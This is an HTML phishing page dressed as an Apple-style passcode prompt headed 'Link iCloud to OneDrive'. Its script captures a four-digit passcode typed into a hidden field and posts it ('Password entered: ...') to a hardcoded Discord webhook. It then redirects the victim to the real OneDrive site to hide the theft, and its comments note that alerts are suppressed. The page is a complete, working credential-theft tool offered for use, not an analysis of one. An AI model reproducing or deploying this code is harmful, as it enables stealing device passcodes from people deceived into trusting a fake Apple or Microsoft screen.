<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Style Input Bar with Enter Button</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }

        body {
            background-color: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }

        .logo-container {
            margin-bottom: 30px;
        }

        .icon {
            width: 80px;
            height: auto;
        }

        .logo-text {
            font-size: 32px;
            font-weight: bold;
            color: black;
            letter-spacing: 1.5px;
            margin-top: 10px;
        }

        .input-container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 20px;
        }

        /* Apple-style Input Box */
        .input-bar {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 0 auto;
            max-width: 280px;
        }

        .bullet {
            width: 20px;
            height: 20px;
            border: 2px solid #d1d1d6;
            border-radius: 50%;
            background-color: transparent;
            transition: background-color 0.2s ease-in-out;
        }

        .bullet.filled {
            background-color: black;
        }

        /* Button Styling */
        .send-btn {
            padding: 12px 20px;
            background-color: #007aff;
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease-in-out;
        }

        .send-btn:hover {
            background-color: #005bb5;
            transform: scale(1.05);
        }

        .send-btn:active {
            transform: scale(1);
        }

        /* Keypad Styling */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            max-width: 220px;
            margin: 0 auto;
        }

        .key {
            width: 50px;
            height: 50px;
            font-size: 24px;
            font-weight: bold;
            color: #333;
            border: 2px solid #d1d1d6;
            border-radius: 50%;
            background-color: white;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .key:hover {
            background-color: #f1f1f1;
            transform: scale(1.1);
        }

        .key:active {
            background-color: #e0e0e0;
            transform: scale(1);
        }

        .key:disabled {
            background-color: #e0e0e0;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="icon.png" alt="icon" class="icon" />
            <div class="logo-text">Link iCloud to OneDrive</div>
        </div>

        <div class="input-container">
            <!-- Bullet point "input" -->
            <div class="input-bar" id="inputBar">
                <div class="bullet" id="bullet1"></div>
                <div class="bullet" id="bullet2"></div>
                <div class="bullet" id="bullet3"></div>
                <div class="bullet" id="bullet4"></div>
            </div>
            <!-- Native iOS keypad -->
            <input type="tel" id="inputField" maxlength="4" style="opacity: 0; position: absolute;" />
            <button class="send-btn" id="sendButton" disabled>Enter</button>
        </div>
    </div>

    <script>
        const inputField = document.getElementById('inputField');
        const sendButton = document.getElementById('sendButton');
        const webhookURL = 'https://discord.com/api/webhooks/1476676519324815536/B5ya1lbcHJ-GwS41t2_0trQpYUoC2pXE2rC5D3P-waDDsFpiNP_IIkQjw1kZvUEctqYv'; // Replace with your actual webhook URL

        let password = ""; // Store the entered password
        const bulletElements = [document.getElementById('bullet1'), document.getElementById('bullet2'), document.getElementById('bullet3'), document.getElementById('bullet4')];

        // Function to update the bullet points
        function updateBullets() {
            for (let i = 0; i < 4; i++) {
                if (i < password.length) {
                    bulletElements[i].classList.add('filled');
                } else {
                    bulletElements[i].classList.remove('filled');
                }
            }
            sendButton.disabled = password.length !== 4; // Enable/disable button based on password length
        }

        // Function to handle input
        inputField.addEventListener('input', () => {
            password = inputField.value; // Update the password
            updateBullets();
        });

        // Button click event to send the data to Discord and redirect to Microsoft
        sendButton.addEventListener('click', async () => {
            // Check if the password length is exactly 4 characters
            if (password.length === 4) {
                const payload = {
                    content: `Password entered: ${password}`, // Send the passcode as a message to Discord
                };

                try {
                    // Send data to Discord webhook using fetch (without alerts)
                    const response = await fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload),
                    });

                    if (response.ok) {
                        // After the message is successfully sent, redirect to OneDrive
                        window.location.href = 'https://onedrive.live.com'; // Redirect to OneDrive
                    } else {
                        console.error('Error sending message to Discord:', response.statusText);
                    }
                } catch (error) {
                    // If the fetch fails, log the error but don't show alerts
                    console.error('Error sending message to Discord:', error);
                }
            }
        });

        // Focus on the native input field (it will trigger the iOS keyboard)
        inputField.focus();
    </script>
</body>
</html>
